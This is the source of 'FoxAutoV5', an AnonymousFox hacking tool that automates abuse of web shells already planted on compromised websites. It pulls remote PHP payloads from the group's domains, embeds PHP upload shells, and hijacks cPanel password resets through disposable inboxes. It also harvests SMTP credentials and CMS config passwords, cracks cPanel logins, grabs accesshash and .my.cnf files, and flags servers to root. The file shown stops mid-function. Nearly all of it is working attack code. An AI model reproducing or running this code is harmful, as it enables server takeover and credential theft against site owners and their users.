#donwload python (Preferred Python 2.7.14) => https://www.python.org/downloads/release/python-2714/
#install requests, how ? => https://anonymousfox.io/_@info/requests.txt
#install colorama, how ? => https://anonymousfox.io/_@info/colorama.txt
#install selenium, how ? => https://anonymousfox.io/_@info/selenium.txt
#install imgurpython, how ? => https://anonymousfox.io/_@info/imgurpython.txt
#get Chrome Driver, how ? => https://anonymousfox.io/_@info/ChromeDriver.txt
#run by Double Click on FoxAutoV5.py
#OR run like (Windows) => FoxAutoV5.py lists.txt
#OR run like (python 2.7) => python FoxAutoV5.py lists.txt
#OR run like (python 3) => python3 FoxAutoV5.py lists.txt

# Notice : Be careful not to use any similar script !! Some sons of the bitchs stole the script for the v1 source and v2 source ... 
#           and they attributed our efforts to them! In order to protect our efforts, we have already encrypted v3 , v4 and v5 script, 
#           and we will disable all previous versions!

import re, sys, os, random, string, time
from time import time as timer
try :
	import requests
except :
	exit('\n   [!] Error, You have to install [requests], Read how => https://anonymousfox.io/_@info/requests.txt ')
try :
	from colorama import Fore
	from colorama import init
except :
	exit('\n   [!] Error, You have to install [colorama], Read how => https://anonymousfox.io/_@info/colorama.txt ')
init(autoreset=True)
requests.packages.urllib3.disable_warnings()

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
fy  =   Fore.YELLOW
fb  =   Fore.BLUE

def URLdomain_Fox(site):
	if (site.startswith("http://")) :
		site = site.replace("http://", "")
	elif (site.startswith("https://")) :
		site = site.replace("https://", "")
	if ('www.' in site) :
		site = site.replace("www.", "")
	if ('/' in site):
		site = site.rstrip()
		site = site.split('/')[0]
	return site

def URL_FOX(site):
	if (site.startswith("http://")) :
		site = site.replace("http://", "")
		p = 'http://'
	elif (site.startswith("https://")) :
		site = site.replace("https://", "")
		p = 'https://'
	else :
		p = 'http://'
	if ('/' in site):
		site = site.rstrip()
		site = site.split('/')[0]
	return p+site

def USER_FOX(site):
	if (site.startswith("http://")) :
		site = site.replace("http://","")
	elif (site.startswith("https://")) :
		site = site.replace("https://","")
	site = site.rstrip()
	site = site.split('/')[0]
	if ('www.' in site) :
		site = site.replace("www.", "")
	site = site.split('.')[0]
	return site

def input_Fox(txt):
	try :
		if (sys.version_info[0] < 3):
			return raw_input(txt).strip()
		else :
			sys.stdout.write(txt)
			return input()
	except:
		return False

def file_get_contents_Fox(filename):
	with open(filename) as f:
		return f.read()

def random_Fox(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

def imgur_Fox(path):
	try:
		from imgurpython import ImgurClient
		client_id = 'a2ba0d8b80a23ef'
		client_secret = '036153ab688cfe3b136cc663ca7cc7284547c37f'
		client_Fox = ImgurClient(client_id, client_secret)
		items_Fox = client_Fox.upload_from_path('screenshots/'+path, config=None, anon=True)
		if (sys.version_info[0] < 3):
			urlpng_Fox = re.findall(re.compile('u\'link\': u\'(.*)\','), str(items_Fox))[0]
		else :
			urlpng_Fox = re.findall(re.compile('\'link\': \'(.*)\','), str(items_Fox))[0]
		if ("'" in urlpng_Fox) :
			urlpng_Fox = urlpng_Fox.split("'")[0]
		return urlpng_Fox
	except:
		return False

def gyazo_Fox(path):
	try :
		from gyazo import Api
		client_Fox = Api(access_token='77cdc709f311ed09720d5fb2d1205fb6378b3247796e4d3c2b47172d464d9481')
		with open('screenshots/'+path, 'rb') as fox:
			image_Fox = client_Fox.upload_image(fox)
			urlpng_Fox = re.findall(re.compile('"url": "(.*)\.png"'), str(image_Fox.to_json()))[0] + '.png'
			return urlpng_Fox
	except :
		print('\n   [!] Error, You have to change your IP by VPN \n')
		return False

def content_Fox(req):
	try :
		try :
			return str(req.content.decode('utf-8'))
		except UnicodeEncodeError:
			try :
				return str(req.content.encode('utf-8'))
			except UnicodeDecodeError:
				return str(req.content)
	except :
		return str(req.text)

def log() :
	log =  """  
   {}[#]{} Create By ::
	{}  ___                                                    ______        
	{} / _ \                                                   |  ___|       
	{}/ /_\ \_ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___ | |_ _____  __
	{}|  _  | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __||  _/ _ \ \/ /
	{}| | | | | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \| || (_) >  < 
	{}\_| |_/_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/\_| \___/_/\_\ 
	{}                          __/ |
	{}                         |___/ {}FoxAuto {}v5 {}[Priv8]
	""".format(fr, fw, fg, fr, fg, fr, fg, fr, fg, fr, fw, fg, fr)
	for line in log.split("\n"):
		print(line)
		time.sleep(0.15)

headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

def shellFox():
	try:
		global shell_Fox
		global checkups
		domS = ['anonymousfox.is', 'anonymousfox.mx', 'anonymousfox.pw']
		for dom in domS :
			try:
				shell_Fox = requests.get('https://{}/_@files/php/FoxAutoV5.txt'.format(dom), headers=headers, timeout=10)
				shell_Fox = content_Fox(shell_Fox)
			except :
				shell_Fox = ''
			if ('Anonymous_Fox' in shell_Fox):
				checkups = shell_Fox
				break
		if ('Anonymous_Fox' not in shell_Fox):
			print('   [!] There error ! Do a report for AnonymousFox, Telegram: {}@Anonymous_F0x\n'.format(fc))
			exit(0)
	except :
		print('   [!] There error ! Do a report for AnonymousFox, Telegram: {}@Anonymous_F0x\n'.format(fc))
		exit(0)

testSendA = """ 
<?php
error_reporting(0);

?>
Upload is <b><color>WORKING</color></b><br>
Check  Mailling ..<br>
<form method="post">
<input type="text" placeholder="E-Mail" name="email" value="<?php print $_POST['email']?>"required ><input type="text" placeholder="Order ID" name="orderid" value="<?php print $_POST['orderid']?>" ><br>
<input type="submit" value="Send test >>">
</form>
<br>
<?php

if (!empty($_POST['email'])){
	if (!empty($_POST['email'])){
		$xx =$_POST['orderid'];
	}
	else{
		$xx = rand();
	
	}
	mail($_POST['email'],"Result Report Test - ".$xx,"WORKING ! FoxAutoV5");
	print "<b>send an report to [".$_POST['email']."] - Order : $xx</b>"; 
}

?>
"""

testSendB = """
<?php
error_reporting(0);

?>
Upload is <b><color>WORKING</color></b><br>
Check  Mailling ..<br>
<form method="post">
<input type="text" placeholder="E-Mail" name="email" value="<?php print $_POST['email']?>"required ><input type="text" placeholder="Order ID" name="orderid" value="<?php print $_POST['orderid']?>" ><br>
<input type="submit" value="Send test >>">
</form>
<br>
<?php
if ($_GET['Ghost'] =='send'){


$uploaddir = './';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if ( isset($_FILES["userfile"]) ) {
    echo "Upload ";
    if (move_uploaded_file
($_FILES["userfile"]["tmp_name"], $uploadfile))
echo $uploadfile;
    else echo "failed";
}


   echo "
<form name='uplform' method='post' action='?Ghost=send'
enctype='multipart/form-data'>
<p align='center'>
<input type='file' name='userfile'>
<input type='submit'>
</p>
";
}


if (!empty($_POST['email'])){
	if (!empty($_POST['email'])){
		$xx =$_POST['orderid'];
	}
	else{
		$xx = rand();
	
	}
	mail($_POST['email'],"Result Report Test - ".$xx,"WORKING ! FoxAutoV5");
	print "<b>send an report to [".$_POST['email']."] - Order : $xx</b>"; 
}

?>
"""

def changemail_Fox():
	try :
		session = requests.session()
		payload = {"f": "get_email_address"}
		r = session.get("http://api.guerrillamail.com/ajax.php", params=payload)
		email_Fox = r.json()["email_addr"]
		return email_Fox, session.cookies
	except :
		return False

def checkinbox(cookies,user):
	Scode_F0x = 'AnonymousFox'
	try :
		cookies={"PHPSESSID":cookies}
		session = requests.session()
		payload_Fox = {"f": "set_email_user", "email_user":user, "lang":"en"}
		r = session.get("http://api.guerrillamail.com/ajax.php", params=payload_Fox, cookies=cookies)
		payload_Fox = {"f": "check_email", "seq": "1"}
		r = session.get("http://api.guerrillamail.com/ajax.php", params=payload_Fox, cookies=cookies)
		for email in r.json()["list"]:
			if ('cpanel' in email["mail_from"]):
				email_id = email["mail_id"]
				payload_Fox = {"f": "fetch_email", "email_id": email_id}
				r = session.get("http://api.guerrillamail.com/ajax.php", params=payload_Fox, cookies=cookies)
				Scode_F0x = r.json()['mail_body'].split('<p style="border:1px solid;margin:8px;padding:4px;font-size:16px;width:250px;font-weight:bold;">')[1].split('</p>')[0]
				payload_Fox = {"f": "del_email","email_ids[]":int(email_id)}
				r = session.get("http://api.guerrillamail.com/ajax.php", params=payload_Fox, cookies=cookies)
			else :
				Scode_F0x = 'AnonymousFox'
		return Scode_F0x
	except :
		return Scode_F0x

def checkinboxTestPHP(cookies, user, code):
	rz = 'bad'
	try :
		cookies={"PHPSESSID":cookies}
		session = requests.session()
		payload = {"f": "set_email_user", "email_user":user, "lang":"en"}
		r = session.get("http://api.guerrillamail.com/ajax.php", params=payload, cookies=cookies)
		payload = {"f": "check_email", "seq": "1"}
		r = session.get("http://api.guerrillamail.com/ajax.php", params=payload, cookies=cookies)
		for email in r.json()["list"]:
			if (str(code) in email["mail_subject"]):
				rz = 'good'
			else :
				rz = 'bad'
		return rz
	except :
		return rz

def resetPassword(backdor, urlShell, t) :
	try :
		print('   {}[*] Reset Password ..... {}(Waiting)'.format(fw, fr))
		token = random_Fox(3)+'Fox'+random_Fox(3)
		post0 = {'resetlocal': token, 'get3': 'get3', 'token':t, 'act':'AnonymousFox'}
		try :
			check = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post0, headers=headers, timeout=15)
		except:
			check = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post0, headers=headers, timeout=30)
		check = content_Fox(check)
		if ('Error-one' in check):
			print('   {}[-] There is no cPanel'.format(fr))
		elif ('Error-two' in check):
			print('   {}[-] Reset Password Disabled'.format(fr))
		elif ('<cpanel>' in check):
			cpanelRt = re.findall(re.compile(':2083\|(.*)</cpanel>'), check)[0]
			domain = re.findall(re.compile('https://(.*):2083\|'), check)[0]
			print('   {}[+] Succeeded\n       - {}https://{}:2083|{}'.format(fg, fr, domain, cpanelRt))
			open('Results/cPanel_Reset.txt', 'a').write('https://{}:2083|{}'.format(domain, cpanelRt) + '\n')
		else :
			src = str(changemail_Fox())
			email = re.findall(re.compile('\'(.*)\', <RequestsCookieJar'), src)[0]
			cookies = re.findall(re.compile('name=\'PHPSESSID\', value=\'(.*)\', port='), src)[0]
			post1 = {'email': email, 'get': 'get'}
			try :
				check = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post1,headers=headers, timeout=15)
			except:
				check = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post1, headers=headers, timeout=30)
			time.sleep(10)
			code = checkinbox(cookies, email)
			start = timer()
			while ((code == 'AnonymousFox') and ((timer() - start) < 90)):
				time.sleep(30)
				code = checkinbox(cookies, email)
			if (code == 'AnonymousFox') :
				print('   {}[-] Reset Password Failed\n   {}[!] Try {}[Semi-Automatic]'.format(fr, fw, fr))
				open('Results/Bad_cPanel_Reset.txt', 'a').write('{}\n'.format(urlShell))
			else :
				post2 = {'code': code, 'get2': 'get2'}
				try :
					check2 = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=30)
				except:
					check2 = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=30)
				check2 = content_Fox(check2)
				if ('<cpanel>' in check2) :
					cpanelRt = re.findall(re.compile(':2083\|(.*)</cpanel>'), check2)[0]
					domain = re.findall(re.compile('https://(.*):2083\|'), check2)[0]
					print('   {}[+] Succeeded\n       - {}https://{}:2083|{}'.format(fg, fr, domain, cpanelRt))
					open('Results/cPanel_Reset.txt', 'a').write('https://{}:2083|{}'.format(domain, cpanelRt) + '\n')
				else :
					print('   {}[-] Reset Password Failed\n   {}[!] Try {}[Semi-Automatic]'.format(fr, fw, fr))
					open('Results/Bad_cPanel_Reset.txt', 'a').write('{}\n'.format(urlShell))
	except :
		print('   {}[-] Reset Password Failed\n   {}[!] Try {}[Semi-Automatic]'.format(fr, fw, fr))
		open('Results/Bad_cPanel_Reset.txt', 'a').write('{}\n'.format(urlShell))

def resetPassword2(backdor,email) :
	try :
		print('   {}[*] Reset Password ..... {}(Waiting)'.format(fw, fr))
		post = {'email': email, 'get': 'get'}
		try :
			check = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=15)
		except:
			check = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=30)
		check = content_Fox(check)
		if ('Error-one' in check):
			print('   {}[-] There is no cPanel'.format(fr))
		elif ('Error-two' in check):
			print('   {}[-] Reset Password Disabled'.format(fr))
		elif ('./Done' in check):
			print('   {}[+] The system sent the security code to your email!'.format(fg))
			code = str(input_Fox('   {}[!] Enter the security code :{} '.format(fw, fr)))
			post2 = {'code': code, 'get2': 'get2'}
			try :
				check2 = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=15)
			except:
				check2 = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=30)
			check2 = content_Fox(check2)
			if ('<cpanel>' in check2):
				cpanelRt = re.findall(re.compile(':2083\|(.*)</cpanel>'), check2)[0]
				domain = re.findall(re.compile('https://(.*):2083\|'), check2)[0]
				print('   {}[+] Succeeded\n       - {}https://{}:2083|{}'.format(fg, fr, domain, cpanelRt))
				open('Results/cPanel_Reset.txt', 'a').write('https://{}:2083|{}'.format(domain, cpanelRt) + '\n')
			else :
				print('   {}[-] Reset Password Failed'.format(fr))
	except:
		print('   {}[-] Reset Password Failed'.format(fr))

def finderSMTP(backdor) :
	try :
		post = {'finderSMTP': 'AnonymousFox'}
		print('   {}[*] Finder SMTP ..... {}(Waiting)'.format(fw, fr))
		try :
			finderSMTP = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=15)
		except:
			finderSMTP = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=30)
		finderSMTP = content_Fox(finderSMTP)
		if ('Error-SMTP' in finderSMTP) :
			print('   {}[-] Another hacker has already withdraw it'.format(fr))
		elif ('<findersmtp>' in finderSMTP) :
			if (re.findall(re.compile('<findersmtp>(.*)</findersmtp>'), finderSMTP)):
				SMTPs = re.findall(re.compile('<findersmtp>(.*)</findersmtp>'), finderSMTP)
			print('   {}[+] Succeeded'.format(fg))
			for SMTP in SMTPs:
				if ('!!' in SMTP) :
					SMTP = SMTP.replace("!!", "@")
				print('       {}- {}{}'.format(fg, fr, SMTP))
				open('Results/SMTPs.txt', 'a').write(SMTP + '\n')
		else :
			print('   {}[-] There is no SMTP'.format(fr))
	except:
		print('   {}[-] Failed'.format(fr))

def getSMTP(backdor) :
	try :
		post = {'getSMTP': 'AnonymousFox'}
		print('   {}[*] Create SMTP ..... {}(Waiting)'.format(fw, fr))
		try :
			getSMTP = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=15)
		except:
			getSMTP = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=30)
		getSMTP = content_Fox(getSMTP)
		if ('<smtp>' in getSMTP) :
			smtpC = re.findall(re.compile('<smtp><domain>Domian => (.*)</domain><port><br>Port => (.*)</port><smtpname><br>SMTPname => (.*)</smtpname><password><br>Password => (.*)</password></smtp>'),getSMTP)[0]
			smtp = '{}|{}|{}@{}|{}'.format(smtpC[0], smtpC[1], smtpC[2], smtpC[0], smtpC[3])
			print('   {}[+] Succeeded\n       - {}{}'.format(fg, fr, smtp))
			open('Results/SMTPs_Create.txt', 'a').write(smtp + '\n')
		else :
			print('   {}[-] There is no WebMail'.format(fr))
	except:
		print('   {}[-] Failed'.format(fr))

def finderScript(backdor, shell) :
	try :
		print('   {}[*] Finder Script ..... {}(Waiting)'.format(fw, fr))
		post = {'pwd': 'AnonymousFox'}
		try :
			srcServerFox = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=15)
		except:
			srcServerFox = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=30)
		srcServerFox = content_Fox(srcServerFox)
		uname = re.findall(re.compile('<uname><font color="red"><center>(.*)</center> </font><br></uname>'), srcServerFox)[0]
		pwd = re.findall(re.compile('<pwd><font color="blue"><center>(.*)</center></font><br></pwd>'), srcServerFox)[0]
		print('   {}[U] '.format(fm) + uname)
		print('   {}[P] '.format(fm) + pwd)
		open('Results/pwd_uname_servers.txt', 'a').write('{}\n{}\n{}\n-----------------------------------------------------------------------------------------------------\n'.format(uname, pwd, shell))
		if ('[-] Windows' in srcServerFox):
			print('   {}[S] Windows server'.format(fr))
			open('Results/Windows_servers.txt', 'a').write('{}\n'.format(shell))
		else:
			print('   {}[S] Linux server'.format(fg))
			if (' 2015 ' in uname or ' 2014 ' in uname or ' 2013 ' in uname or ' 2012 ' in uname or ' 2011 ' in uname or ' 2010 ' in uname) :
				open('Results/Roots_servers.txt', 'a').write('{}\n'.format(shell))
			elif (' 2016 ' in uname):
				if (' Dec ' not in uname and ' Nov ' not in uname):
					open('Results/Roots_servers.txt', 'a').write('{}\n'.format(shell))
			if ('[+] cPanel' in srcServerFox):
				print('   {}[+] cPanel script'.format(fg))
				open('Results/cPanels_servers.txt', 'a').write('{}\n'.format(shell))
			elif ('[+] vHosts' in srcServerFox):
				print('   {}[+] vHosts script'.format(fg))
				open('Results/vHosts_servers.txt', 'a').write('{}\n'.format(shell))
	except:
		print('   {}[-] Failed'.format(fr))

def accesshash(backdor, shell) :
	try:
		print('   {}[*] Accesshash + .my.cnf ..... {}(Waiting)'.format(fw, fr))
		post = {'acc': 'AnonymousFox'}
		try :
			checkacc = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=15)
		except:
			checkacc = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=30)
		checkacc = content_Fox(checkacc)
		if ('[+] Accesshash' in checkacc) :
			print('   {}    -{} {} => {}[{}Accesshash{}]'.format(fr, fg, shell, fr, fg, fr))
			open('Results/accesshash.txt', 'a').write('{}?php={}/_@files/php/accesshash.txt\n'.format(backdor, dom))
		else :
			print('   {}    - {} => [Not Found Accesshash]'.format(fr, shell))
		if ('[+] mycnf' in checkacc) :
			print('   {}    -{} {} => {}[{}Mycnf{}]'.format(fr, fg, shell, fr, fg, fr))
			open('Results/mycnf.txt', 'a').write('{}?php={}/_@files/php/mycnf.txt\n'.format(backdor, dom))
		else :
			print('   {}    - {} => [Not Found Mycnf]'.format(fr, shell))
	except:
		print('   {}[-] Failed'.format(fr))

def getConfig(backdor, shell):
	try :
		s1 = backdor
		while ('/' in s1):
			s1 = s1[s1.index("/") + len("/"):]
		sh_path = backdor.replace(s1, 'Fox-C/')
		post = {'config': 'AnonymousFox'}
		print('   {}[*] Trying get Config ..... {}(Waiting)'.format(fw, fr))
		try :
			getConfig = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=180)
		except :
			getConfig = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=240)
		getConfig = content_Fox(getConfig)
		if ('Error-Config' in getConfig) :
			print('   {}[-] CageFS (CloudLinux)'.format(fr))
			sh_path = getConfigCFS(backdor, shell)
			if (sh_path is False) :
				return False
			else :
				return sh_path
		try :
			checkConfig = requests.get(sh_path, headers=headers, timeout=120)
		except :
			checkConfig = requests.get(sh_path, headers=headers, timeout=150)
		checkConfig = content_Fox(checkConfig)
		if ('Index of' in checkConfig) :
			print('   {}[+] Config => {}{}'.format(fg, fr, sh_path))
			print('   {}[*] Trying Check Scripts ..... {}(Waiting)'.format(fw, fr))
			getscript_str = str(getscript(backdor, sh_path, shell))
			if (getscript_str == 'Problem101') :
				print('   {}[-] Please , Check form this manually'.format(fr))
				return False
			elif (getscript_str == 'Problem404') :
				print('   {}[-] 404 Config'.format(fr))
				sh_path = getConfig404(backdor, shell)
				if (sh_path is False):
					return False
				else :
					return sh_path
			else :
				print(getscript_str)
				return sh_path
		else :
			print('   {}[-] Failed'.format(fr))
			return False
	except:
		print('   {}[-] Failed'.format(fr))
		return False

def getConfig404(backdor, shell):
	try :
		s1 = backdor
		while ('/' in s1):
			s1 = s1[s1.index("/") + len("/"):]
		sh_path = backdor.replace(s1, 'Fox-C404/')
		post = {'config404': 'AnonymousFox'}
		print('   {}[*] Trying get config{}404{} ..... {}(Waiting)'.format(fw, fr, fw, fr))
		try :
			getConfig = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=180)
		except :
			getConfig = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=240)
		try :
			checkConfig = requests.get(sh_path, headers=headers, timeout=120)
		except :
			checkConfig = requests.get(sh_path, headers=headers, timeout=150)
		checkConfig = content_Fox(checkConfig)
		if ('Index of' in checkConfig) :
			print('   {}[+] Config => {}{}'.format(fg, fr, sh_path))
			print('   {}[*] Trying Check Scripts ..... {}(Waiting)'.format(fw, fr))
			getscript_str = str(getscript404(backdor, sh_path, shell))
			print(getscript_str)
			if ('There is no Config!' not in getscript_str) :
				return sh_path
			else :
				return False
		else :
			print('   {}[-] Failed'.format(fr))
			return False
	except:
		print('   {}[-] Failed'.format(fr))
		return False

def getConfigCFS(backdor, shell):
	try :
		s1 = backdor
		while ('/' in s1):
			s1 = s1[s1.index("/") + len("/"):]
		sh_path = backdor.replace(s1, 'Fox-CCFS/')
		post = {'configCFS': 'AnonymousFox'}
		print('   {}[*] Trying get config{}CFS{} ..... {}(Waiting)'.format(fw, fg, fw, fr))
		try :
			getConfig = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=500)
		except :
			getConfig = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=500)
		try :
			checkConfig = requests.get(sh_path, headers=headers, timeout=120)
		except :
			checkConfig = requests.get(sh_path, headers=headers, timeout=150)
		checkConfig = content_Fox(checkConfig)
		if ('Index of' in checkConfig) :
			print('   {}[+] Config => {}{}'.format(fg, fr, sh_path))
			print('   {}[*] Trying Check Scripts ..... {}(Waiting)'.format(fw, fr))
			getscript_str = str(getscript(backdor, sh_path,shell))
			if (getscript_str == 'Problem101') :
				print('   {}[-] Please , Check form this manually'.format(fr))
				return False
			elif (getscript_str == 'Problem404') :
				print('   {}[-] There is no Config!'.format(fr))
				return False
			else :
				print(getscript_str)
				return sh_path
		else :
			print('   {}[-] Failed'.format(fr))
			return False
	except :
		print('   {}[-] Failed'.format(fr))
		return False

def getscript(backdor, config, shell) :
	rz = 'Problem404'
	try :
		post = {'dir': config, 'getPasswords': 'AnonymousFox'}
		try:
			getScript = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=500)
		except:
			getScript = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=500)
		getScript = content_Fox(getScript)
		if ('Problem101' in getScript):
			rz = 'Problem101'
		elif ('Problem404' in getScript) :
			rz = 'Problem404'
		elif ('<password>' in getScript):
			if (re.findall(re.compile('<br><wordpress>(.*)</wordpress><br>'), getScript)):
				countWP = int(re.findall(re.compile('<br><wordpress>(.*)</wordpress><br>'), getScript)[0])
			else :
				countWP = 0
			if (re.findall(re.compile('<br><joomla>(.*)</joomla><br>'), getScript)):
				countJM = int(re.findall(re.compile('<br><joomla>(.*)</joomla><br>'), getScript)[0])
			else :
				countJM = 0
			if (re.findall(re.compile('<br><opencart>(.*)</opencart><br>'), getScript)):
				countOC = int(re.findall(re.compile('<br><opencart>(.*)</opencart><br>'), getScript)[0])
			else :
				countOC = 0
			rz = '   {}[+] Found {}{}{} WordPress Config, {}{}{} Joomla Config, {}{}{} OpenCart Config'.format(fg, fr, countWP, fg, fr, countJM, fg, fr, countOC, fg)
			open('Results/Configs.txt', 'a').write('Shell => {}\nConfig => {}\n[+] Found {} WordPress Config , {} Joomla Config , {} OpenCart Config\n-----------------------------------------------------------------------------------------------------\n'.format(shell, config, countWP, countJM, countOC))
		else :
			rz = 'Problem404'
		return rz
	except:
		return rz

def getscript404(backdor, config, shell) :
	rz = '   {}[-] There is no Config!'.format(fr)
	try :
		post = {'dir': config, 'getPasswords': 'AnonymousFox'}
		try:
			getScript = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=500)
		except:
			getScript = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=500)
		getScript = content_Fox(getScript)
		if ('<password>' in getScript):
			if (re.findall(re.compile('<br><wordpress>(.*)</wordpress><br>'), getScript)):
				countWP = int(re.findall(re.compile('<br><wordpress>(.*)</wordpress><br>'), getScript)[0])
			else :
				countWP = 0
			if (re.findall(re.compile('<br><joomla>(.*)</joomla><br>'), getScript)):
				countJM = int(re.findall(re.compile('<br><joomla>(.*)</joomla><br>'), getScript)[0])
			else :
				countJM = 0
			if (re.findall(re.compile('<br><opencart>(.*)</opencart><br>'), getScript)):
				countOC = int(re.findall(re.compile('<br><opencart>(.*)</opencart><br>'), getScript)[0])
			else :
				countOC = 0
			rz = '   {}[+] Found {}{}{} WordPress Config, {}{}{} Joomla Config, {}{}{} OpenCart Config'.format(fg, fr, countWP, fg, fr, countJM, fg, fr, countOC, fg)
			open('Results/Configs.txt', 'a').write('Shell => {}\nConfig => {}\n[+] Found {} WordPress Config , {} Joomla Config , {} OpenCart Config\n-----------------------------------------------------------------------------------------------------\n'.format(shell, config, countWP, countJM, countOC))
		else :
			rz = '   {}[-] There is no Config!'.format(fr)
		return rz
	except:
		return rz

def getConfigPasswords_cPanelcracker(backdor, config) :
	try:
		print('   {}[*] GetPasswords/CPanelCrack ..... {}(Waiting)'.format(fw, fr))
		post = {'dir':config, 'getPasswords':'AnonymousFox'}
		post2 = {'getUser': 'AnonymousFox'}
		try:
			getPassword = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=300)
		except:
			getPassword = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=360)
		getPassword = content_Fox(getPassword)
		try :
			getUsername = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=15)
		except:
			getUsername = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=30)
		getUsername = content_Fox(getUsername)
		if ('<password>' in getPassword) :
			if (re.findall(re.compile('<br><password>(.*)</password>'), getPassword)):
				passwords = re.findall(re.compile('<br><password>(.*)</password>'),getPassword)
				passwordsTXT = ''
			if (re.findall(re.compile('<user>(.*)</user>'), getUsername)):
				usernames = re.findall(re.compile('<user>(.*)</user>'),getUsername)
				usernamesTXT = ''
			for password in passwords:
				passwordsTXT = passwordsTXT + str(password) + '\n'
			for username in usernames:
				usernamesTXT = usernamesTXT + str(username) + '\n'
			post = {'passwords':passwordsTXT, 'usernames':usernamesTXT, 'crackCP':'AnonymousFox'}
			try :
				cPanelcracker = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=500)
			except:
				cPanelcracker = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=1000)
			cPanelcracker = content_Fox(cPanelcracker)
			if ('<center><font color=blue>You Found 0 cPanel' in cPanelcracker) :
				print('   {}[-] Found 0 cPanel'.format(fr))
			else :
				n = re.findall(re.compile('<center><font color=blue>You Found (.*) cPanel \(Cracker\)</font></center>'), cPanelcracker)[0]
				if (re.findall(re.compile('<center> Host : https://(.*):2083 User : <b><font color=#1eca33>(.*)</font></b> Password : <b><font color=red>(.*)</font></b><br/></center>'), cPanelcracker)):
					cpanels = re.findall(re.compile('<center> Host : https://(.*):2083 User : <b><font color=#1eca33>(.*)</font></b> Password : <b><font color=red>(.*)</font></b><br/></center>'),cPanelcracker)
				print('   {}[+] Found {} cPanel'.format(fg, n))
				for cpanel in cpanels:
					cp ='https://'+cpanel[0]+':2083|'+cpanel[1]+'|'+cpanel[2]
					print('   {}   - {}{}'.format(fg, fr, cp))
					open('Results/cPanelCrack.txt', 'a').write(cp + '\n')
		else :
			print('   {}[-] Please , Check form this manually'.format(fr))
	except:
		print('   {}[-] Please , Check form this manually'.format(fr))

def getRoot(backdor, shell):
	try :
		post = {'getRoot': 'AnonymousFox'}
		post2 = {'checkRoot': 'AnonymousFox'}
		print('   {}[*] Trying get Root ..... {}(Waiting)'.format(fw, fr))
		try :
			getRoot = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=60)
			getRoot = content_Fox(getRoot)
		except :
			getRoot = ''
		if ('Error2-Root' in getRoot) :
